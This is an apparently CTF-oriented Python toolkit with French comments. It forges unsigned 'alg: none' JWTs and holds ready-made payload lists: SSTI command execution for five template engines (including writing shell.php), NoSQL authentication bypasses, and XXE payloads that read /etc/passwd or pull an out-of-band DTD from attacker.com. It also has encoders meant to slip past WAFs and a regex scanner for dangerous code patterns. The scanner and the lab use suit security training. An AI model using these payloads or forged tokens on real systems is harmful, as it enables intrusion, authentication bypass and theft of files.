"""
=============================================================================
  Module Web Security & Code Audit - HackerLab Toolkit
=============================================================================
  Description : Décodeur et forgeur de JWT (alg: none), générateur de payloads
                SSTI (Jinja2, Twig, ERB), audit de code source (Regex de failles)
                et tables de référence SQLi / PHP Type Juggling pour CTF.
=============================================================================
"""

import base64
import datetime
import json
import re

class JWTTool:
    @staticmethod
    def decode(jwt_str):
        """Décode les 3 parties d'un JWT (Header, Payload, Signature) sans vérification."""
        parts = jwt_str.strip().split('.')
        if len(parts) != 3:
            return {"error": "Format JWT invalide (doit contenir 3 segments séparés par des points)"}

        def b64url_decode(s):
            s += '=' * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s.encode()).decode(errors="ignore"))

        try:
            header = b64url_decode(parts[0])
            payload = b64url_decode(parts[1])
            signature = parts[2]

            # Interprétation des dates
            dates = {}
            for field in ["exp", "nbf", "iat"]:
                if field in payload and isinstance(payload[field], (int, float)):
                    dt = datetime.datetime.utcfromtimestamp(payload[field])
                    dates[field] = f"{dt.isoformat()} UTC ({payload[field]})"

            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "timestamps": dates,
                "is_none_alg": header.get("alg", "").lower() == "none"
            }
        except Exception as e:
            return {"error": f"Erreur de décodage JSON : {e}"}

    @staticmethod
    def forge_none_alg(header_dict, payload_dict):
        """Forge un JWT non signé avec l'algorithme 'none'."""
        header_dict["alg"] = "none"
        
        def b64url_enc(obj):
            raw = json.dumps(obj, separators=(',', ':')).encode()
            return base64.urlsafe_b64encode(raw).decode().rstrip('=')

        h_b64 = b64url_enc(header_dict)
        p_b64 = b64url_enc(payload_dict)
        return f"{h_b64}.{p_b64}."

class SSTIPayloadHelper:
    TEMPLATES = {
        "Jinja2 (Python / Flask)": [
            "{{ 7 * 7 }}",
            "{{ config.items() }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
        ],
        "Twig (PHP / Symfony)": [
            "{{ 7 * 7 }}",
            "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
            "{{ ['id']|filter('system') }}"
        ],
        "Ruby ERB": [
            "<%= 7 * 7 %>",
            "<%= `id` %>",
            "<%= system('cat /etc/passwd') %>"
        ],
        "Smarty (PHP)": [
            "{7*7}",
            "{php}echo `id`;{/php}",
            "{Smarty_Internal_Write_File::writeFile('shell.php','<?php phpinfo(); ?>',self::clearConfig())}"
        ],
        "FreeMarker (Java / Spring)": [
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
        ]
    }

    @classmethod
    def get_payloads(cls):
        return cls.TEMPLATES

class CodeAuditor:
    DANGEROUS_PATTERNS = [
        {"lang": "PHP", "type": "Command Injection", "regex": r"(system|exec|passthru|shell_exec|popen|proc_open)\s*\(.*\$_(GET|POST|REQUEST|COOKIE)", "severity": "CRITICAL"},
        {"lang": "PHP", "type": "Code Evaluation", "regex": r"(eval|assert|create_function)\s*\(.*\$_(GET|POST|REQUEST)", "severity": "CRITICAL"},
        {"lang": "PHP", "type": "Insecure Deserialization", "regex": r"unserialize\s*\(.*\$_(GET|POST|REQUEST|COOKIE)", "severity": "CRITICAL"},
        {"lang": "PHP", "type": "Local File Inclusion (LFI)", "regex": r"(include|require|include_once|require_once)\s*\(.*\$_(GET|POST|REQUEST)", "severity": "HIGH"},
        {"lang": "Python", "type": "Command Injection", "regex": r"(os\.system|os\.popen|subprocess\.call|subprocess\.Popen)\s*\(.*(request\.|sys\.argv)", "severity": "CRITICAL"},
        {"lang": "Python", "type": "Dangerous Deserialization", "regex": r"pickle\.loads?\s*\(", "severity": "HIGH"},
        {"lang": "Python", "type": "Code Eval", "regex": r"(eval|exec)\s*\(.*request\.", "severity": "CRITICAL"},
        {"lang": "Node.js", "type": "Code Execution", "regex": r"(eval|Function|vm\.runInThisContext)\s*\(.*req\.", "severity": "CRITICAL"},
        {"lang": "SQL", "type": "SQL Injection Pattern", "regex": r"(SELECT|INSERT|UPDATE|DELETE)\s+.*WHERE\s+.*\+.*\$_(GET|POST)", "severity": "CRITICAL"}
    ]

    @classmethod
    def scan_code(cls, code_text):
        """Scanne un extrait de code source pour repérer des failles de sécurité évidentes."""
        findings = []
        lines = code_text.splitlines()
        for idx, line in enumerate(lines, 1):
            for rule in cls.DANGEROUS_PATTERNS:
                if re.search(rule["regex"], line, re.IGNORECASE):
                    findings.append({
                        "line_num": idx,
                        "line_content": line.strip(),
                        "language": rule["lang"],
                        "vulnerability": rule["type"],
                        "severity": rule["severity"]
                    })
        return findings

class WebPayloads:
    NOSQL_PAYLOADS = [
        {"desc": "Bypass d'authentification JSON ($ne)", "payload": '{"username": {"$ne": null}, "password": {"$ne": null}}'},
        {"desc": "Bypass d'authentification URL-encoded ($ne)", "payload": "username[$ne]=admin&password[$ne]=admin"},
        {"desc": "Extraction par Regex ($regex)", "payload": '{"username": "admin", "password": {"$regex": "^a.*"}}'},
        {"desc": "Exécution de condition ($where)", "payload": '{"$where": "this.password.match(/^flag.*/)"}'}
    ]

    XXE_PAYLOADS = [
        {"desc": "Lecture de fichier local (/etc/passwd)", "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>"""},
        {"desc": "Extraction Base64 via wrapper PHP", "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<root><name>&xxe;</name></root>"""},
        {"desc": "XXE Out-of-Band (OOB Exfiltration)", "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>
<root></root>"""}
    ]

    @classmethod
    def get_nosql(cls):
        return cls.NOSQL_PAYLOADS

    @classmethod
    def get_xxe(cls):
        return cls.XXE_PAYLOADS

    @staticmethod
    def encode_payload(payload_text, encoding_type="double-url"):
        """Encode un payload pour tester les contournements de filtres (WAF / Sanitizers)."""
        import urllib.parse
        if encoding_type == "url":
            return urllib.parse.quote(payload_text)
        elif encoding_type == "double-url":
            return urllib.parse.quote(urllib.parse.quote(payload_text))
        elif encoding_type == "hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload_text)
        elif encoding_type == "html-entities":
            return "".join(f"&#{ord(c)};" for c in payload_text)
        elif encoding_type == "charcode":
            codes = [str(ord(c)) for c in payload_text]
            return f"String.fromCharCode({','.join(codes)})"
        return payload_text
